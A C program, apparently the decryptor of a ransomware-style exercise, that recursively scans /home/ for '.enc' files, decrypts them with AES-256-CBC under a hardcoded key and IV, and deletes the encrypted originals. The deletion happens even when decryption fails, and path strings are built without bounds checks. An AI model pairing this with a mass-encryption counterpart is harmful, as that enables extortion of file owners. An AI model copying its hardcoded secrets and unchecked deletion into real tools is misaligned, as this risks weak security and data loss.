#include <string.h>
#include <stdio.h>
#include <stdlib.h>
#include <dirent.h>
#include <openssl/evp.h>
#include <openssl/aes.h>

void decrypter_fichier(FILE * entree, FILE* sortie, unsigned char* cle, unsigned char* iv);
void parcourir_repertoire(char* chemin_debut);

int main()
{
    char* chemin_debut;
    chemin_debut = "/home/";
    parcourir_repertoire(chemin_debut);

    return 0;
}

void parcourir_repertoire(char* chemin_debut)
{
    unsigned char cle[] = "12345678901234561234567890123456"; // Clé de 32 caractères, soit 256 bits
    unsigned char iv[] = "1234567890123456"; // Taille identique au bloc, soit 16 caractères, soit 128 bits

    DIR* repertoire;
    struct dirent *entree;
    if ((repertoire = opendir(chemin_debut)) != NULL)
    {
        while ((entree = readdir(repertoire)) != NULL)
        {
            if (entree->d_type == DT_REG) // Vérifier si c'est un fichier ordinaire
            {
                int longueur = strlen(entree->d_name);
                const char* extension = &entree->d_name[longueur - 4];
                if (strcmp(extension, ".enc") == 0)
                {
                    char* chemin_complet =(char*)malloc(strlen(entree->d_name) + strlen(chemin_debut) + 2);
                    strcpy(chemin_complet, chemin_debut);
                    strcat(chemin_complet, entree->d_name);
                    char* nouveau_nom = (char*)malloc(strlen(chemin_complet) + 1);
                    strcpy(nouveau_nom, chemin_complet);
                    nouveau_nom[strlen(nouveau_nom) - 4] = '\0';

                    FILE* entree_fichier;
                    FILE* sortie_fichier;

                    entree_fichier = fopen(chemin_complet, "rb");
                    sortie_fichier = fopen(nouveau_nom, "wb");

                    if (entree_fichier != NULL && sortie_fichier != NULL)
                    {
                        decrypter_fichier(entree_fichier, sortie_fichier, cle, iv);
                        fclose(entree_fichier);
                        fclose(sortie_fichier);
                        remove(chemin_complet);
                    }
                    else
                    {
                        printf("Erreur lors de l'ouverture des fichiers.\n");
                    }
                    free(chemin_complet);
                    free(nouveau_nom);
                }
            }

            if (entree->d_type == DT_DIR) // Vérifier si c'est un répertoire
            {
                if (strcmp(entree->d_name, ".") != 0 && strcmp(entree->d_name, "..") != 0)
                {
                    char* chemin_complet = (char*)malloc(strlen(chemin_debut) + strlen(entree->d_name) + 2);
                    strcpy(chemin_complet, chemin_debut);
                    strcat(chemin_complet, entree->d_name);
                    strcat(chemin_complet, "/");
                    printf("%s\n", chemin_complet);
                    parcourir_repertoire(chemin_complet);
                    free(chemin_complet);
                }
            }
        }
        closedir(repertoire);
    }
}

void decrypter_fichier(FILE * entree, FILE* sortie, unsigned char* cle, unsigned char* iv)
{
    const unsigned taille_buffer = 4096; // octets à lire
    unsigned char* buffer_lecture = malloc(taille_buffer); // tampon pour contenir le texte du fichier
    unsigned char* buffer_cipher; // texte déchiffré
    unsigned taille_bloc;
    int longueur_sortie;

    EVP_CIPHER_CTX *ctx = EVP_CIPHER_CTX_new(); // Allocation dynamique

    EVP_CipherInit(ctx, EVP_aes_256_cbc(), cle, iv, 0); // 0 = déchiffrer, 1 = chiffrer
    taille_bloc = EVP_CIPHER_CTX_block_size(ctx);
    buffer_cipher = malloc(taille_buffer + taille_bloc);

    // Lire le fichier et écrire dans le fichier déchiffré jusqu'à la fin du fichier
    while(1)
    {
        int octets_lus = fread(buffer_lecture, sizeof(unsigned char), taille_buffer, entree);
        EVP_CipherUpdate(ctx, buffer_cipher, &longueur_sortie, buffer_lecture, octets_lus);
        fwrite(buffer_cipher, sizeof(unsigned char), longueur_sortie, sortie);
        if (octets_lus < taille_buffer)
        {
            break; // Fin de fichier
        }
    }

    EVP_CipherFinal(ctx, buffer_cipher, &longueur_sortie);
    fwrite(buffer_cipher, sizeof(unsigned char), longueur_sortie, sortie);

    free(buffer_cipher);
    free(buffer_lecture);
    EVP_CIPHER_CTX_free(ctx); // Libération de la mémoire
}
